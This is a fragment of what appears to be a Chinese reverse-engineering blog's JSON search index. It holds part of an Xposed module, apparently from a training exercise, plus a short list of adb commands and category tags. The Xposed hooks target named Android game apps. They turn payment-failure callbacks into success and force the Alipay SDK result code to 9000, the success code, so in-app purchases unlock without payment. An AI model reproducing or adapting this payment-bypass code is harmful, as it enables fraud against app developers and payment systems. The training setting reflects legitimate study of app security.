XposedHelpers.callMethod(methodHookParam.thisObject,&quot;paySuccess&quot;,methodHookParam.args); return null; } }); XposedHelpers.findAndHookMethod(&quot;com.qy.zombie.zombie$3&quot;, loadPackageParam.classLoader, &quot;payFailed&quot;, Map.class, new XC_MethodReplacement() { @Override protected Object replaceHookedMethod(MethodHookParam methodHookParam) throws Throwable { XposedHelpers.callMethod(methodHookParam.thisObject,&quot;paySuccess&quot;,methodHookParam.args); return null; } }); } if (loadPackageParam.packageName.equals(&quot;com.june.game.doudizhu&quot;)){ XposedHelpers.findAndHookMethod(&quot;com.alipay.sdk.app.j&quot;, loadPackageParam.classLoader, &quot;a&quot;, int.class, new XC_MethodHook() { @Override protected void beforeHookedMethod(MethodHookParam param) throws Throwable { super.beforeHookedMethod(param); XposedBridge.log(&quot;Str参数：&quot; + param.args[0]); param.args[0] = 9000; XposedBridge.log(&quot;修改后参数：&quot;+param.args[0]); } }); } if (loadPackageParam.packageName.equals(&quot;com.prgame5.fish2.baidu&quot;)){ XposedHelpers.findAndHookMethod(&quot;com.alipay.sdk.app.i&quot;, loadPackageParam.classLoader, &quot;a&quot;, int.class, new XC_MethodHook() { @Override protected void beforeHookedMethod(MethodHookParam param) throws Throwable { super.beforeHookedMethod(param); XposedBridge.log(&quot;Str参数：&quot; + param.args[0]); param.args[0] = 9000; XposedBridge.log(&quot;修改后参数：&quot;+param.args[0]); } }); } } }","link":"/2021/11/05/%E6%98%93%E9%94%A6%E5%AE%89%E5%8D%93%E9%80%86%E5%90%91%E7%B2%BE%E8%8B%B1%E5%9F%B9%E8%AE%AD/Xposed%E6%A1%86%E6%9E%B6%E4%B8%93%E9%A2%98/xposed%E6%A1%86%E6%9E%B6%E8%80%83%E8%AF%95/"},{"title":"","text":"查看当前连接设备adb devices 查看日志adb logcat 安装apk文件adb install xxx.apk 卸载Appadb uninstall com.zhy.app 进入命令行adb shell 查看当前活动界面信息adb shell dumpsys activity top |findstr pid","link":"/2021/11/05/%E6%98%93%E9%94%A6%E5%AE%89%E5%8D%93%E9%80%86%E5%90%91%E7%B2%BE%E8%8B%B1%E5%9F%B9%E8%AE%AD/Java%E5%B1%82%E9%80%86%E5%90%91%E5%88%86%E6%9E%90%E4%B8%93%E8%BE%91/2.Android%E5%BC%80%E5%8F%91/adb%20%E5%91%BD%E4%BB%A4/"}],"tags":[],"categories":[{"name":"木马分析","slug":"木马分析","link":"/categories/%E6%9C%A8%E9%A9%AC%E5%88%86%E6%9E%90/"},{"name":"反调试","slug":"反调试","link":"/categories/%E5%8F%8D%E8%B0%83%E8%AF%95/"},{"name":".net木马","slug":"木马分析/net木马","link":"/categories/%E6%9C%A8%E9%A9%AC%E5%88%86%E6%9E%90/net%E6%9C%A8%E9%A9%AC/"},{"name":"内核分析逆向","slug":"内核分析逆向","link":"/categories/%E5%86%85%E6%A0%B8%E5%88%86%E6%9E%90%E9%80%86%E5%90%91/"},{"name":"E盾反调试分析","slug":"反调试/E盾反调试分析","link":"/categories/%E5%8F%8D%E8%B0%83%E8%AF%95/E%E7%9B%BE%E5%8F%8D%E8%B0%83%E8%AF%95%E5%88%86%E6%9E%90/"},{"name":"调试工具","slug":"调试工具","link":"/categories/%E8%B0%83%E8%AF%95%E5%B7%A5%E5%85%B7/"},{"name":"x32","slug":"反调试/x32","link":"/categories/%E5%8F%8D%E8%B0%83%E8%AF%95/x32/"},{"name":"WinDbg","slug":"调试工具/WinDbg","link":"/categories/%E8%B0%83%E8%AF%95%E5%B7%A5%E5%85%B7/WinDbg/"},{"name":"vt","slug":"vt","link":"/categories/vt/"},{"name":"x64汇编","slug":"x64汇编","link":"/categories/x64%E6%B1%87%E7%BC%96/"},{"name":"x64","slug":"x64","link":"/categories/x64/"},{"name":"R3","slug":"反调试/R3","link":"/categories/%E5%8F%8D%E8%B0%83%E8%AF%95/R3/"},{"name":"学习笔记","slug":"vt/学习笔记","link":"/categories/vt/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"},{"name":"学习笔记","slug":"x64汇编/学习笔记","link":"/categories/x64%E6%B1%87%E7%BC%96/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"},{"name":"内核逆向分析中有趣的技巧","slug":"内核分析逆向/内核逆向分析中有趣的技巧","link":"/categories/%E5%86%85%E6%A0%B8%E5%88%86%E6%9E%90%E9%80%86%E5%90%91/%E5%86%85%E6%A0%B8%E9%80%86%E5%90%91%E5%88%86%E6%9E%90%E4%B8%AD%E6%9C%89%E8%B6%A3%E7%9A%84%E6%8A%80%E5%B7%A7/"},{"name":"常用代码笔记","slug":"常用代码笔记","link":"/categories/%E5%B8%B8%E7%94%A8%E4%BB%A3%E7%A0%81%E7%AC%94%E8%AE%B0/"},{"name":"学习笔记","slug":"x64/学习笔记","link":"/categories/x64/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"},{"name":"vscode","slug":"vscode","link":"/categories/vscode/"},{"name":"驱动开发","slug":"驱动开发","link":"/categories/%E9%A9%B1%E5%8A%A8%E5%BC%80%E5%8F%91/"},{"name":"汇编","slug":"x64/汇编","link":"/categories/x64/%E6%B1%87%E7%BC%96/"},{"name":"获取系统版本号","slug":"常用代码笔记/获取系统版本号","link":"/categories/%E5%B8%B8%E7%94%A8%E4%BB%A3%E7%A0%81%E7%AC%94%E8%AE%B0/%E8%8E%B7%E5%8F%96%E7%B3%BB%E7%BB%9F%E7%89%88%E6%9C%AC%E5%8F%B7/"},{"name":"内核","slug":"x64/内核","link":"/categories/x64/%E5%86%85%E6%A0%B8/"},{"name":"快捷键","slug":"vscode/快捷键","link":"/categories/vscode/%E5%BF%AB%E6%8D%B7%E9%94%AE/"},{"name":"api","slug":"驱动开发/api","link":"/categories/%E9%A9%B1%E5%8A%A8%E5%BC%80%E5%8F%91/api/"},{"name":"x64InlineHook","slug":"x64/x64InlineHook","link":"/categories/x64/x64InlineHook/"},{"name":"保护模式","slug":"x64/保护模式","link":"/categories/x64/%E4%BF%9D%E6%8A%A4%E6%A8%A1%E5%BC%8F/"},{"name":"异常","slug":"x64/内核/异常","link":"/categories/x64/%E5%86%85%E6%A0%B8/%E5%BC%82%E5%B8%B8/"},{"name":"调用门","slug":"x64/保护模式/调用门","link":"/categories/x64/%E4%BF%9D%E6%8A%A4%E6%A8%A1%E5%BC%8F/%E8%B0%83%E7%94%A8%E9%97%A8/"},{"name":"内存映射","slug":"x64/内核/内存映射","link":"/categories/x64/%E5%86%85%E6%A0%B8/%E5%86%85%E5%AD%98%E6%98%A0%E5%B0%84/"},{"name":"漏洞隐藏注入","slug":"x64/内核/漏洞隐藏注入","link":"/categories/x64/%E5%86%85%E6%A0%B8/%E6%BC%8F%E6%B4%9E%E9%9A%90%E8%97%8F%E6%B3%A8%E5%85%A5/"},{"name":"r3进入r0","slug":"x64/内核/r3进入r0","link":"/categories/x64/%E5%86%85%E6%A0%B8/r3%E8%BF%9B%E5%85%A5r0/"},{"name":"保护模式","slug":"保护模式","link":"/categories/%E4%BF%9D%E6%8A%A4%E6%A8%A1%E5%BC%8F/"}]}